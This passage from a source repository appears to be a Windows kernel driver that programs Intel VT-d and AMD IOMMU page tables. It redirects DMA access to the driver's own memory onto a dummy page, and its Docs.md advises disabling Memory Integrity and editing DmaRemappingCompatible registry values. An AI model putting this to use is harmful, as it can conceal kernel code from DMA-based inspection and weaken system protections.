    for (UINT64 bus = 0; bus < ARRAY_SIZE(Translations->RootTable); bus++)
    {
        Translations->RootTable[bus] = defaultRootValue;
    }

    //
    // Fill out the context table. All context entries point to the same
    // second-level PML4.
    //
    // Note that pass-through translations can also be archived by setting 10b to
    // the TT: Translation Type field, instead of using the second-level page
    // tables.
    //
    defaultContextValue.Uint128.Uint64Hi = defaultContextValue.Uint128.Uint64Lo = 0;
    defaultContextValue.Bits.DomainIdentifier = 2;
    defaultContextValue.Bits.AddressWidth = BIT1;  // 010b: 48-bit AGAW (4-level page table)
    UINT64 Pml4 = (UINT64)Memory::VirtToPhy(Translations->SlPml4);
    defaultContextValue.Bits.SecondLevelPageTranslationPointerLo = (UINT32)(Pml4 >> 12);
    defaultContextValue.Bits.SecondLevelPageTranslationPointerHi = (UINT32)(Pml4 >> 32);
    defaultContextValue.Bits.Present = TRUE;
    for (UINT64 i = 0; i < ARRAY_SIZE(Translations->ContextTable); i++)
    {
        Translations->ContextTable[i] = defaultContextValue;
    }

    //
    // Fill out the second level page tables. All entries indicates readable and
    // writable, and translations are identity mapping. No second-level page table
    // is used to save space. All PDEs are configured for 2MB large pages.
    //
    destinationPa = 0;

    //
    // SL-PML4. Only the first entry (ie, translation up to 512GB) is initialized.
    //
    pml4Index = 0;
    pdpt = Translations->SlPdpt[pml4Index];
    pml4e = &Translations->SlPml4[pml4Index];
    pml4e->Uint64 = (UINT64)Memory::VirtToPhy(pdpt);
    pml4e->Bits.Read = TRUE;
    pml4e->Bits.Write = TRUE;

    for (UINT64 pdptIndex = 0; pdptIndex < 512; pdptIndex++)
    {
        //
        // SL-PDPT
        //
        pd = Translations->SlPd[pml4Index][pdptIndex];
        pdpte = &pdpt[pdptIndex];
        pdpte->Uint64 = (UINT64)Memory::VirtToPhy(pd);
        pdpte->Bits.Read = TRUE;
        pdpte->Bits.Write = TRUE;

        for (UINT64 pdIndex = 0; pdIndex < 512; pdIndex++)
        {
            //
            // SL-PD.
            //
            pde = &pd[pdIndex];
            pde->Uint64 = destinationPa;
            pde->Bits.Read = TRUE;
            pde->Bits.Write = TRUE;
            pde->Bits.PageSize = TRUE;
            destinationPa += SIZE_2MB;
        }
    }

    //
    // Write-back the whole range of the translations object to RAM. This flushing
    // cache line is not required if the C: Page-walk Coherency bit is set. Same
    // as other flush in this project. All author's units did not set this bit.
    //
    CPU::WriteBackDataCacheRange(Translations, sizeof(*Translations));
}

/**
* @brief Splits the PDE to a new PT.
*/
VTD_SECOND_LEVEL_PAGING_ENTRY*
Split2MbPage(
    IN OUT VTD_SECOND_LEVEL_PAGING_ENTRY* PageDirectoryEntry
)
{
    UINT64 baseAddress;
    VTD_SECOND_LEVEL_PAGING_ENTRY* pageTable;
    BOOLEAN readable;
    BOOLEAN writable;

    ASSERT(PageDirectoryEntry->Bits.PageSize == TRUE);

    pageTable = (VTD_SECOND_LEVEL_PAGING_ENTRY*)cpp::kMalloc(PAGE_SIZE);
    if (pageTable == NULL)
    {
        goto Exit;
    }
    RtlZeroMemory(pageTable, PAGE_SIZE);

    //
    // Those fields should inherit from the PDE.
    //
    readable = (PageDirectoryEntry->Bits.Read != FALSE);
    writable = (PageDirectoryEntry->Bits.Write != FALSE);

    //
    // Fill out the page table.
    //
    baseAddress = ((UINT64)PageDirectoryEntry->Bits.AddressLo << 12) |
        ((UINT64)PageDirectoryEntry->Bits.AddressHi << 32);
    for (UINT64 ptIndex = 0; ptIndex < 512; ++ptIndex)
    {
        pageTable[ptIndex].Uint64 = baseAddress;
        pageTable[ptIndex].Bits.Read = readable;
        pageTable[ptIndex].Bits.Write = writable;
        baseAddress += PAGE_SIZE;
    }

    //
    // The PDE should no longer indicates 2MB large page.
    //
    PageDirectoryEntry->Uint64 = (UINT64)Memory::VirtToPhy(pageTable);
    PageDirectoryEntry->Bits.PageSize = FALSE;
    PageDirectoryEntry->Bits.Read = TRUE;
    PageDirectoryEntry->Bits.Write = TRUE;

    //
    // Write back changes to RAM. Also, invalidation of IOTLB would be required
    // if the DMA-remapping is already enabled. Not the case in this project.
    //
    CPU::WriteBackDataCacheRange(PageDirectoryEntry, sizeof(*PageDirectoryEntry));
    CPU::WriteBackDataCacheRange(pageTable, PAGE_SIZE);

    baseAddress = ((UINT64)PageDirectoryEntry->Bits.AddressLo << 12) |
        ((UINT64)PageDirectoryEntry->Bits.AddressHi << 32);
    DbgMsg("[VT-d] Split page at %p to 0x%llx", PageDirectoryEntry, baseAddress);
Exit:
    return pageTable;
}

/**
 * @brief Updates the access permissions in the translations for the given address.
 *
 * @note As the name suggests, this change is applied for all devices, ie, you
 *       may not specify a source-id (ie, bus:device:function). This is purely
 *       for overall simplicity of this project.
 */
EFI_STATUS
ChangePermissionOfPageForAllDevices(
    IN OUT DMAR_TRANSLATIONS* Translations,
    IN UINT64 Address,
    IN BOOLEAN AllowReadWrite,
    OUT VTD_SECOND_LEVEL_PAGING_ENTRY** AllocatedPageTable
)
{
    PHYSICAL_ADDRESS pa = { 0 };
    EFI_STATUS status;
    ADDRESS_TRANSLATION_HELPER helper;
    VTD_SECOND_LEVEL_PAGING_ENTRY* pde;
    VTD_SECOND_LEVEL_PAGING_ENTRY* pt;
    VTD_SECOND_LEVEL_PAGING_ENTRY* pte;

    *AllocatedPageTable = NULL;

    helper.AsUInt64 = Address;
    DbgMsg("[VT-d] Target 0x%llx at pml4: 0x%llx, pdpt: 0x%llx, pdt: 0x%llx, pt: 0x%llx",
        helper.AsUInt64,
        helper.AsIndex.Pml4, helper.AsIndex.Pdpt, helper.AsIndex.Pd, helper.AsIndex.Pt);

    //
    // Locate the second-level PDE for the given address. If that entry indicates
    // the page is 2MB large page, split it into 512 PTEs so that the exactly
    // specified page (4KB) only is updated.
    //
    if (helper.AsIndex.Pml4) {
        DbgMsg("[VT-d] This is not a physical address: 0x%llx", Address);
        return STATUS_UNSUCCESSFUL;
    }

    pde = &Translations->SlPd[helper.AsIndex.Pml4][helper.AsIndex.Pdpt][helper.AsIndex.Pd];
    if (pde->Bits.PageSize != FALSE)
    {
        *AllocatedPageTable = Split2MbPage(pde);
        if (*AllocatedPageTable == NULL)
        {
            status = STATUS_RESOURCE_NOT_OWNED;
            goto Exit;
        }
    }

    //
    // Then, update the single PTE that corresponds to the given address.
    //
    pt = (VTD_SECOND_LEVEL_PAGING_ENTRY*)(((UINT64)pde->Bits.AddressLo << 12) |
        ((UINT64)pde->Bits.AddressHi << 32));
    pa.QuadPart = (ULONGLONG)pt;
    pt = (VTD_SECOND_LEVEL_PAGING_ENTRY*)MmMapIoSpaceEx(pa, PAGE_SIZE, PAGE_READWRITE | PAGE_NOCACHE);
    pte = &pt[helper.AsIndex.Pt];
    pte->Bits.Read = AllowReadWrite;
    pte->Bits.Write = AllowReadWrite;
    CPU::WriteBackDataCacheRange(pte, sizeof(*pte));

    //
    // We are good. Note that any of page table updates would require invalidation
    // of IOTLB if DMA-remapping is already enabled. In our case, not yet.
    //
    status = STATUS_SUCCESS;
    MmUnmapIoSpace((PVOID)pt, PAGE_SIZE);

Exit:
    return status;
}

EFI_STATUS
ChangePointerOfPageForAllDevices(
    IN OUT DMAR_TRANSLATIONS* Translations,
    IN UINT64 Address,
    IN UINT64 SubstituteAddress,
    OUT VTD_SECOND_LEVEL_PAGING_ENTRY** AllocatedPageTable
)
{
    PHYSICAL_ADDRESS pa = { 0 };
    EFI_STATUS status;
    ADDRESS_TRANSLATION_HELPER helper;
    VTD_SECOND_LEVEL_PAGING_ENTRY* pde;
    VTD_SECOND_LEVEL_PAGING_ENTRY* pt;
    VTD_SECOND_LEVEL_PAGING_ENTRY* pte;

    *AllocatedPageTable = NULL;

    if (MmIsAddressValid((PVOID)Address))
        Address = Memory::VirtToPhy((PVOID)Address);

    helper.AsUInt64 = Address;
    DbgMsg("[VT-d] Target 0x%llx at pml4: 0x%llx, pdpt: 0x%llx, pdt: 0x%llx, pt: 0x%llx",
        helper.AsUInt64,
        helper.AsIndex.Pml4, helper.AsIndex.Pdpt, helper.AsIndex.Pd, helper.AsIndex.Pt);

    //
    // Locate the second-level PDE for the given address. If that entry indicates
    // the page is 2MB large page, split it into 512 PTEs so that the exactly
    // specified page (4KB) only is updated.
    //
    if (helper.AsIndex.Pml4) {
        DbgMsg("[VT-d] Physical address outside boundaries: 0x%llx", Address);
        return STATUS_UNSUCCESSFUL;
    }

    pde = &Translations->SlPd[helper.AsIndex.Pml4][helper.AsIndex.Pdpt][helper.AsIndex.Pd];
    if (pde->Bits.PageSize != FALSE)
    {
        *AllocatedPageTable = Split2MbPage(pde);
        if (*AllocatedPageTable == NULL)
        {
            status = STATUS_RESOURCE_NOT_OWNED;
            goto Exit;
        }
    }

    //
    // Then, update the single PTE that corresponds to the given address.
    //
    pt = (VTD_SECOND_LEVEL_PAGING_ENTRY*)(((UINT64)pde->Bits.AddressLo << 12) |
        ((UINT64)pde->Bits.AddressHi << 32));
    pa.QuadPart = (ULONGLONG)pt;
    pt = (VTD_SECOND_LEVEL_PAGING_ENTRY*)MmMapIoSpaceEx(pa, PAGE_SIZE, PAGE_READWRITE | PAGE_NOCACHE);
    pte = &pt[helper.AsIndex.Pt];

    if (MmIsAddressValid((PVOID)SubstituteAddress))
        SubstituteAddress = Memory::VirtToPhy((PVOID)SubstituteAddress);

    pte->Bits.AddressLo = SubstituteAddress >> 12;
    pte->Bits.AddressHi = SubstituteAddress >> 32;
    CPU::WriteBackDataCacheRange(pte, sizeof(*pte));

    //
    // We are good. Note that any of page table updates would require invalidation
    // of IOTLB if DMA-remapping is already enabled. In our case, not yet.
    //
    status = STATUS_SUCCESS;
    MmUnmapIoSpace((PVOID)pt, PAGE_SIZE);

Exit:
    return status;
}

/**
 * @brief Enables DMA-remapping for the hardware unit using the given translation.
 */
VOID
EnableDmaRemapping(
    IN CONST DMAR_UNIT_INFORMATION* DmarUnit,
    IN CONST DMAR_TRANSLATIONS* Translations
)
{
    DbgMsg("[VT-d] Working with the remapping unit at %p", DmarUnit->RegisterBasePa);

    acpi::DmarRegister reg(DmarUnit->RegisterBasePa);

    //
    // Set the Root Table Pointer. This is equivalent to setting CR3 conceptually.
    // After setting the "SRTP: Set Root Table Pointer" bit, software must wait
    // completion of it. See 10.4.5 Global Status Register.
    //
    DbgMsg("[VT-d] Setting the root table pointer to %p", Translations->RootTable);
    reg.SetRootTable((PVOID)Translations->RootTable);

    //
    // Then, invalidate cache that may exists as requested by the specification.
    //
    // "After a ‘Set Root Table Pointer’ operation, software must perform global
    //  invalidations on the context-cache, pasid-cache, and IOTLB, in that order."
    // See 10.4.4 Global Command Register
    //

    //
    // Invalidate context-cache. See 10.4.7 Context Command Register.
    //
    DbgMsg("[VT-d] Invalidating context-cache globally");

    // Disable queued invalidations (used by windows)
    reg.SendGlobalCmdSerialized(B_GMCD_REG_QIE, false);
    reg.SendContextCmdSerialized(V_CCMD_REG_CIRG_GLOBAL);

    //
    // Invalidate IOTLB. See 10.4.8.1 IOTLB Invalidate Register.
    // Also drain all read and write requests.
    // "Hardware implementations supporting DMA draining must drain any inflight
    //  DMA read/write requests"
    //
    //DbgMsg("[VT-d] Invalidating IOTLB globally");
    //reg.InvalidateIoTlb(B_IOTLB_REG_IVT | V_IOTLB_REG_IIRG_GLOBAL | V_IOTLB_REG_DR | V_IOTLB_REG_DW);

    //
    // Enabling DMA-remapping. See 10.4.4 Global Command Register.
    //
    reg.SendGlobalCmdSerialized(B_GMCD_REG_TE, true);
    reg.SendGlobalCmdSerialized(B_GMCD_REG_QIE, true);

    DbgMsg("[VT-d] Enabled DMA-remapping!");
}

/**
 * @brief Disables DMA-remapping for the hardware unit.
 */
VOID
DisableDmaRemapping(
    IN CONST DMAR_UNIT_INFORMATION* DmarUnit
)
{
    acpi::DmarRegister reg(DmarUnit->RegisterBasePa);
    reg.SendGlobalCmdSerialized(B_GMCD_REG_TE, false);

    DbgMsg("[VT-d] Disabled DMA-remapping!");
}

PIOMMU_PAGE_TABLES iommuTables = nullptr;

PIOMMU_PAGE_TABLES SetupIommu(PPCI_CONFIG_SPACE iommuConfigSpace) {
    DWORD64 iommuCtlRegPa = 0;
    PIOMMU_CAP_BLOCK_REGISTER iommu = (PIOMMU_CAP_BLOCK_REGISTER)((DWORD64)iommuConfigSpace + iommuConfigSpace->NonCommon.Device.CapabilityPtr);
    iommuCtlRegPa = ((ULONG64)iommu->baseAddressLow.BaseAddress_18_14 << 14) | ((ULONG64)iommu->baseAddressLow.BaseAddress_31_19 << 19);
    iommuCtlRegPa |= ((ULONG64)iommu->baseAddressHigh << 32);
    DbgMsg("[IOMMU] Control register at pa: 0x%llx", iommuCtlRegPa);

    PHYSICAL_ADDRESS pa = { 0 };
    pa.QuadPart = iommuCtlRegPa;
    PIOMMU_MMIO iommuCtlReg = (PIOMMU_MMIO)MmMapIoSpace(pa, 0x3000, MEMORY_CACHING_TYPE::MmNonCached);
    iommuCtlReg->ctrlReg.IommuEn = false;

    pa.QuadPart = iommuCtlReg->devTableBaseReg.DevTabBase << 12;
    PIOMMU_DEVICE_TABLE_ENTRY pDte = (PIOMMU_DEVICE_TABLE_ENTRY)MmMapIoSpace(pa, PAGE_SIZE * (iommuCtlReg->devTableBaseReg.Size + 1), MEMORY_CACHING_TYPE::MmNonCached);

    PIOMMU_PAGE_TABLES pPageTables = iommu::CreateIommuPageTables();
    if (!pPageTables) {
        DbgMsg("[IOMMU] Failed allocating page table buffer!");
        return nullptr;
    }

    void* pSubstitutePage = cpp::kMalloc(PAGE_SIZE);
    RtlCopyMemory(pSubstitutePage, pDte, PAGE_SIZE);

    for (int dteIdx = 0; dteIdx < (iommuCtlReg->devTableBaseReg.Size + 1) * (PAGE_SIZE / sizeof(*pDte)); dteIdx++) {
        if (!pDte[dteIdx]._63_0.PagingMode) {
            pDte[dteIdx]._63_0.PageTableRootPtr = Memory::VirtToPhy(pPageTables->level4) >> 12;
            pDte[dteIdx]._63_0.PagingMode = 4;
        }
    }
    return pPageTables;
}

VOID EnableIommu(PPCI_CONFIG_SPACE iommuConfigSpace) {
    DWORD64 iommuCtlRegPa = 0;
    PIOMMU_CAP_BLOCK_REGISTER iommu = (PIOMMU_CAP_BLOCK_REGISTER)((DWORD64)iommuConfigSpace + iommuConfigSpace->NonCommon.Device.CapabilityPtr);
    iommuCtlRegPa = ((ULONG64)iommu->baseAddressLow.BaseAddress_18_14 << 14) | ((ULONG64)iommu->baseAddressLow.BaseAddress_31_19 << 19);
    iommuCtlRegPa |= ((ULONG64)iommu->baseAddressHigh << 32);
    DbgMsg("[IOMMU] Control register at pa: 0x%llx", iommuCtlRegPa);

    PHYSICAL_ADDRESS pa = { 0 };
    pa.QuadPart = iommuCtlRegPa;
    PIOMMU_MMIO iommuCtlReg = (PIOMMU_MMIO)MmMapIoSpace(pa, 0x3000, MEMORY_CACHING_TYPE::MmNonCached);

    void* pSubstitutePage = cpp::kMalloc(PAGE_SIZE);
    RtlCopyMemory(pSubstitutePage, PAGE_ALIGN(iommuCtlReg), PAGE_SIZE);

    iommuCtlReg->ctrlReg.IommuEn = true;
}

bool bIommuInit = false;
DMAR_TRANSLATIONS* translations = nullptr;

DMAR_UNIT_INFORMATION dmarUnits[8] = { 0 };
UINT64 dmarUnitCount = 0;

PPCI_CONFIG_SPACE pConfigSpace = nullptr;

bool iommu::Init()
{
    if (bIommuInit)
        return true;

    acpi::Init();

    if (CPU::bIntelCPU) {
        NTSTATUS ntStatus = ProcessDmarTable(acpi::dmarTable, dmarUnits, ARRAY_SIZE(dmarUnits), &dmarUnitCount);
        if (!NT_SUCCESS(ntStatus)) {
            DbgMsg("[VT-d] Failed processing DMAR table: 0x%x", ntStatus);
            return false;
        }

        if (!bAllDmaRemappingUnitsCompatible(dmarUnits, dmarUnitCount)) {
            DbgMsg("[VT-d] Some units are incompatible!");
            return false;
        }

        for (UINT64 i = 0; i < dmarUnitCount; i++)
        {
            DisableDmaRemapping(&dmarUnits[i]);
        }

        if (!translations) {
            translations = (DMAR_TRANSLATIONS*)cpp::kMalloc(sizeof(*translations));
            BuildPassthroughTranslations(translations);
            DbgMsg("[VT-d] Built passthrouh translations!");
        }
    }
    else {
        if (!MmIsAddressValid(acpi::mcfgTable)) {
            DbgMsg("[IOMMU] MCFG table ptr is invalid: %p", acpi::mcfgTable);
            return false;
        }
        acpi::McfgRegister mcfgRegister(acpi::mcfgTable);
        for (int i = 0; i < mcfgRegister.size(); i++) {
            pConfigSpace = mcfgRegister.AllPCIeConfigSpace(i);
            if (!MmIsAddressValid(pConfigSpace)) {
                DbgMsg("[IOMMU] Could not map config space!");
                return false;
            }

            for (int j = 0; j < MAX_PCIE_IN_CONFIG_SPACE; j++) {
                PPCI_CONFIG_SPACE pCurrConfigSpace = (PPCI_CONFIG_SPACE)&pConfigSpace[j];

                if (pCurrConfigSpace->Common.Class == SYSTEM_BASE_PERIPHERAL_CLASS
                    && pCurrConfigSpace->Common.Subclass == IOMMU_SUBCLASS
                    && pCurrConfigSpace->Common.ProgInterface == 0) {
                    DbgMsg("[IOMMU] Found IOMMU configuration space at: %p", pCurrConfigSpace);

                    iommuTables = SetupIommu(pCurrConfigSpace);
                    break;
                }
            }
            if (!iommuTables)
                return false;
        }
    }

    bIommuInit = true;
    return true;
}

PIOMMU_PTE
Split2MbPage(
    IN OUT PIOMMU_PTE PageDirectoryEntry
)
{
    UINT64 baseAddress;
    PIOMMU_PTE pageTable;
    BOOLEAN readable;
    BOOLEAN writable;

    pageTable = (PIOMMU_PTE)cpp::kMalloc(PAGE_SIZE);
    if (pageTable == NULL)
    {
        goto Exit;
    }
    RtlZeroMemory(pageTable, PAGE_SIZE);

    //
    // Those fields should inherit from the PDE.
    //
    readable = PageDirectoryEntry->bits.IR;
    writable = PageDirectoryEntry->bits.IW;

    //
    // Fill out the page table.
    //
    baseAddress = PageDirectoryEntry->bits.PageAddress << 12;
    for (UINT64 ptIndex = 0; ptIndex < 512; ++ptIndex)
    {
        pageTable[ptIndex].bits.PageAddress = baseAddress >> 12;
        pageTable[ptIndex].bits.IR = readable;
        pageTable[ptIndex].bits.IW = writable;
        pageTable[ptIndex].bits.PR = true;
        pageTable[ptIndex].bits.NextLevel = 0;
        baseAddress += PAGE_SIZE;
    }

    //
    // The PDE should no longer indicates 2MB large page.
    //
    PageDirectoryEntry->bits.PageAddress = (UINT64)Memory::VirtToPhy(pageTable) >> 12;
    PageDirectoryEntry->bits.NextLevel = 1;
    PageDirectoryEntry->bits.IR = TRUE;
    PageDirectoryEntry->bits.IW = TRUE;

    baseAddress = PageDirectoryEntry->bits.PageAddress << 12;
    DbgMsg("[IOMMU] Split page at %p to 0x%llx", PageDirectoryEntry, baseAddress);
Exit:
    return pageTable;
}

EFI_STATUS
ChangePointerOfPageForIommu(
    IN PIOMMU_PAGE_TABLES pIommuTables,
    IN UINT64 Address,
    IN UINT64 SubstituteAddress,
    OUT PIOMMU_PTE* AllocatedPageTable
)
{
    if (!MmIsAddressValid(pIommuTables)) {
        DbgMsg("[IOMMU] Page table pointer is invalid!");
        return STATUS_NOT_MAPPED_DATA;
    }
    PHYSICAL_ADDRESS pa = { 0 };
    EFI_STATUS status;
    ADDRESS_TRANSLATION_HELPER helper;
    PIOMMU_PTE pde;
    PIOMMU_PTE pt;
    PIOMMU_PTE pte;

    *AllocatedPageTable = NULL;

    if (MmIsAddressValid((PVOID)Address))
        Address = Memory::VirtToPhy((PVOID)Address);

    helper.AsUInt64 = Address;
    DbgMsg("[IOMMU] Target 0x%llx at pml4: 0x%llx, pdpt: 0x%llx, pdt: 0x%llx, pt: 0x%llx",
        helper.AsUInt64,
        helper.AsIndex.Pml4, helper.AsIndex.Pdpt, helper.AsIndex.Pd, helper.AsIndex.Pt);

    //
    // Locate the second-level PDE for the given address. If that entry indicates
    // the page is 2MB large page, split it into 512 PTEs so that the exactly
    // specified page (4KB) only is updated.
    //
    if (helper.AsIndex.Pml4) {
        DbgMsg("[IOMMU] Physical address outside boundaries: 0x%llx", Address);
        return STATUS_UNSUCCESSFUL;
    }

    pde = &pIommuTables->level2[helper.AsIndex.Pdpt][helper.AsIndex.Pd];
    if (pde->bits.NextLevel == 0)
    {
        *AllocatedPageTable = Split2MbPage(pde);
        if (*AllocatedPageTable == NULL)
        {
            status = STATUS_RESOURCE_NOT_OWNED;
            goto Exit;
        }
    }

    //
    // Then, update the single PTE that corresponds to the given address.
    //
    pt = (PIOMMU_PTE)(pde->bits.PageAddress << 12);
    pa.QuadPart = (ULONGLONG)pt;
    pt = (PIOMMU_PTE)MmMapIoSpaceEx(pa, PAGE_SIZE, PAGE_READWRITE | PAGE_NOCACHE);
    pte = &pt[helper.AsIndex.Pt];

    if (MmIsAddressValid((PVOID)SubstituteAddress))
        SubstituteAddress = Memory::VirtToPhy((PVOID)SubstituteAddress);

    pte->bits.PageAddress = SubstituteAddress >> 12;

    status = STATUS_SUCCESS;
    MmUnmapIoSpace((PVOID)pt, PAGE_SIZE);

Exit:
    return status;
}

PIOMMU_PAGE_TABLES iommu::CreateIommuPageTables()
{
    PIOMMU_PAGE_TABLES pPageTables = (PIOMMU_PAGE_TABLES)cpp::kMalloc(sizeof(*pPageTables));
    if (!pPageTables)
        return nullptr;

    RtlZeroMemory(pPageTables, sizeof(*pPageTables));

    pPageTables->level4->bits.PR = true;
    pPageTables->level4->bits.IR = true;
    pPageTables->level4->bits.IW = true;
    pPageTables->level4->bits.PageAddress = Memory::VirtToPhy(pPageTables->level3) >> 12;
    pPageTables->level4->bits.NextLevel = 3;

    IOMMU_PTE level3Template = { 0 };
    level3Template.bits.PR = true;
    level3Template.bits.IR = true;
    level3Template.bits.IW = true;
    level3Template.bits.NextLevel = 2;

    for (DWORD64 EntryIndex = 0; EntryIndex < IOMMU_PAGE_TABLES_ENTRIES; EntryIndex++)
    {
        pPageTables->level3[EntryIndex] = level3Template;
        pPageTables->level3[EntryIndex].bits.PageAddress = Memory::VirtToPhy(&pPageTables->level2[EntryIndex][0]) >> 12;
    }

    IOMMU_PTE level2Template = { 0 };
    level2Template.bits.PR = true;
    level2Template.bits.IR = true;
    level2Template.bits.IW = true;
    level2Template.bits.NextLevel = 0;

    for (DWORD64 EntryGroupIndex = 0; EntryGroupIndex < IOMMU_PAGE_TABLES_ENTRIES; EntryGroupIndex++)
    {
        for (DWORD64 EntryIndex = 0; EntryIndex < IOMMU_PAGE_TABLES_ENTRIES; EntryIndex++)
        {
            pPageTables->level2[EntryGroupIndex][EntryIndex] = level2Template;
            pPageTables->level2[EntryGroupIndex][EntryIndex].bits.PageAddress = (((EntryGroupIndex * IOMMU_PAGE_TABLES_ENTRIES) + EntryIndex) * SIZE_2MB) >> 12;
        }
    }

    return pPageTables;
}

bool iommu::HidePage(PVOID pTarget, PVOID pSubstitute)
{
    if (!bIommuInit
        || !pTarget)
        return false;

    if (!pSubstitute)
        pSubstitute = cpp::kMalloc(PAGE_SIZE);

    if (CPU::bIntelCPU) {
        VTD_SECOND_LEVEL_PAGING_ENTRY* pageEntry;
        ChangePointerOfPageForAllDevices(translations, (UINT64)pTarget, (UINT64)pSubstitute, &pageEntry);
    }
    else {
        PIOMMU_PTE pageEntry;
        ChangePointerOfPageForIommu(iommuTables, (UINT64)pTarget, (UINT64)pSubstitute, &pageEntry);
    }

    return true;
}

bool iommu::HidePageRange(PVOID pBase, SIZE_T szRegion, PVOID pSubstitute)
{
    if (!bIommuInit
        || !pBase)
        return false;

    DWORD64 pages = szRegion / PAGE_SIZE;
    pages += szRegion % PAGE_SIZE ? 1 : 0;

    if (!pSubstitute) {
        pSubstitute = cpp::kMalloc(PAGE_SIZE);
        RtlZeroMemory(pSubstitute, PAGE_SIZE);
    }

    for (DWORD64 i = 0; i < pages; i++) {
        PVOID pTarget = (PVOID)((DWORD64)pBase + i * PAGE_SIZE);
        BOOLEAN bRes = HidePage(pTarget, pSubstitute);
        if (!bRes)
            return false;
    }

    return true;
}

bool iommu::BlockPage(PVOID pTarget)
{
    if (!bIommuInit
        || !pTarget)
        return false;

    VTD_SECOND_LEVEL_PAGING_ENTRY* pageEntry;
    if (MmIsAddressValid(pTarget))
        pTarget = (PVOID)Memory::VirtToPhy(pTarget);
    ChangePermissionOfPageForAllDevices(translations, (UINT64)pTarget, FALSE, &pageEntry);

    return true;
}

bool iommu::BlockPageRange(PVOID pBase, SIZE_T szRegion)
{
    DWORD64 pages = szRegion / PAGE_SIZE;
    pages += szRegion % PAGE_SIZE ? 1 : 0;

    for (DWORD64 i = 0; i < pages; i++) {
        PVOID pTarget = (PVOID)((DWORD64)pBase + i * PAGE_SIZE);
        BOOLEAN bRes = BlockPage(pTarget);
        if (!bRes)
            return false;
    }

    return true;
}

void iommu::EnableIommu()
{
    if (!bIommuInit)
        return;

    if (CPU::bIntelCPU) {
        for (UINT64 i = 0; i < dmarUnitCount; i++)
        {
            EnableDmaRemapping(&dmarUnits[i], translations);
        }
    }
    else {
        for (int j = 0; j < MAX_PCIE_IN_CONFIG_SPACE; j++) {
            PPCI_CONFIG_SPACE pCurrConfigSpace = (PPCI_CONFIG_SPACE)&pConfigSpace[j];

            if (pCurrConfigSpace->Common.Class == SYSTEM_BASE_PERIPHERAL_CLASS
                && pCurrConfigSpace->Common.Subclass == IOMMU_SUBCLASS
                && pCurrConfigSpace->Common.ProgInterface == 0) {
                DbgMsg("[IOMMU] Enabling IOMMU %d", j);

                EnableIommu(pCurrConfigSpace);
                break;
            }
        }
    }
}

```

`DmaProtect/src/main.cpp`:

```cpp
#include "iommu.h"
#include "ddma.h"
#include "status.h"
#include "win.h"
#include "pe.h"

PIMAGE_NT_HEADERS64 GetNtHeaders(void* image_base) {
    const auto dos_header = (PIMAGE_DOS_HEADER)(image_base);
    const auto nt_headers = (PIMAGE_NT_HEADERS64)((DWORD64)(image_base)+dos_header->e_lfanew);
    return nt_headers;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING pRegistryPath) {
    UNREFERENCED_PARAMETER(pRegistryPath);

    CPU::Init();

    if (!iommu::Init()) {
        DbgMsg("[DMA] Failed initializing DMA protection!");
        return STATUS_DMA_REMAPPING_NOT_AVAILABLE;
    }

    PVOID pBase = pDriverObj;
    PIMAGE_NT_HEADERS64 pNtHeader = GetNtHeaders(pBase);

    PVOID pBuffer = cpp::kMalloc(PAGE_SIZE);
    RtlZeroMemory(pBuffer, PAGE_SIZE);

    DdmaProvider dma;
    dma.DiskCopyPage(pBuffer, pBase);

    if (!iommu::HidePageRange(pBase, pNtHeader->OptionalHeader.SizeOfImage)) {
        DbgMsg("[DMA] Failed protecting from DMA accesses!");
        return STATUS_DMA_REMAPPING_FAILED;
    }
    iommu::EnableIommu();

    PVOID pBufferPost = cpp::kMalloc(PAGE_SIZE);
    RtlZeroMemory(pBufferPost, PAGE_SIZE);
    dma.DiskCopyPage(pBufferPost, pBase);

    bool bEqual = memcmp(pBuffer, pBufferPost, PAGE_SIZE) == 0;

    DbgMsg("[RESULT] DMA remapping %s", bEqual ? "didn't work" : "worked");

    DbgMsg("[TEST] MZ check: %s", pBuffer);
    DbgMsg("[TEST] MZ check: %s", pBufferPost);

    return STATUS_SUCCESS;
}
```

`DmaProtect/src/threading.cpp`:

```cpp
#include "threading.h"

void threading::Sleep(int ms)
{
	//Negative values represent a relative interval
	LARGE_INTEGER lInt;
	int wait = ms >= 0 ? ms : MAXINT32;
	lInt.QuadPart = -10000 * (size_t)wait;
	do {
		KeDelayExecutionThread(KernelMode, FALSE, &lInt);
	} while (ms == SLEEP_FOREVER);
}
```

`DmaProtect/src/win.cpp`:

```cpp
#include "win.h"

void* win::FindCurrentBase()
{
    void* currPtr = PAGE_ALIGN(FindCurrentBase);

    while (*(SHORT*)currPtr != (SHORT)'MZ') {
        currPtr = (PVOID)((DWORD64)currPtr - PAGE_SIZE);
    }
    return currPtr;
}

```

`Docs.md`:

```md
# Protect your code from DMA

This repo is designed as an example of how to set up a simple VT-d/IOMMU configuration capable of protecting physical pages
from r/w operations.

There's not many resources on DMA protection online, especially non-UEFI code is absent for both Intel and AMD.

[Tandasat's example](https://github.com/tandasat/HelloIommuPkg) shows how to set up VT-d on boot, and I pasted most of the intel code from there.

AMD examples don't exist, therefore refer back to their documentation, which is included in this project (along with Intel's too) since it's
quite literally **bordeline impossible to even get your hands on** the latest revision of the document, as AMD will remove links to their "old" files.

## How it works

On an extremely simple level, both VT-d and IOMMU perform as their major function something very similar to Intel's [EPT](https://en.wikipedia.org/wiki/Second_Level_Address_Translation).

By following the documentation you're able to setup a new set of page tables that translate from the DMA device's physical address, to an
host physical address of choice.

In this example I'm basically redirecting r/w operations to a dummy page, which results in no error from a DMA device perspective while
still protecting the memory region.

## Requirements
On some Intel machines, no matter the windows version, I have noticed that Windows will freeze up due to some command polling that gets
stuck for VT-d, probably due to my modifications to the base configuration.

A possible workaround for that is [disabling Memory Integrity](https://www.makeuseof.com/core-isolation-memory-integrity-windows/)
and going through all services in Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services, and look for a value DmaRemappingCompatible under key Parameters.

[When the value is anything but 0](https://learn.microsoft.com/en-us/windows-hardware/drivers/pci/enabling-dma-remapping-for-device-drivers), it can [cause issues](https://forum.rme-audio.de/viewtopic.php?id=30110).

AMD doesn't seem to suffer from this same issue and can coexist on all windows versions with Windows.

### Usermode

This protection can obviously be used to protect usermode addresses too, as long as one is fully aware of what he's doing.

Particularly memory locking is **required** as otherwise physical addresses will change, resulting in probable MEMORY_MANAGMENT BSODs.

## Implementation problems

The implementation as it is in this repo is fairly easy to bypass by a DMA capable device, since the page tables don't protect themselves.

Implementing a fix for it is trivial if you know what you're doing, therefore it won't be included to avoid pasting.

# Contacts

